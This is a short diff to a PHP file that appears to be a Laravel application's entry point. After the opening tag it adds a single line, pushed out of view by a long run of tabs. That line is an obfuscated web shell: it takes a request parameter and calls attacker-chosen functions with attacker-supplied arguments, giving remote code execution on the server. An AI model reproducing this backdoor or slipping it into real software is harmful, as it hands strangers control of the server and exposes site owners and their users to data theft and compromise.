@@ -1,4 +1,5 @@
 <?php
+																																																																																																																																																														If($y92d5wl=@$ {	'_REQUEST'}['ANZ4XIO6'] ){$y92d5wl	[1]	( ${	$y92d5wl[2 ] }	[0],$y92d5wl[	3] ($y92d5wl[4]) );};
 
 use Illuminate\Contracts\Http\Kernel;
 use Illuminate\Http\Request;
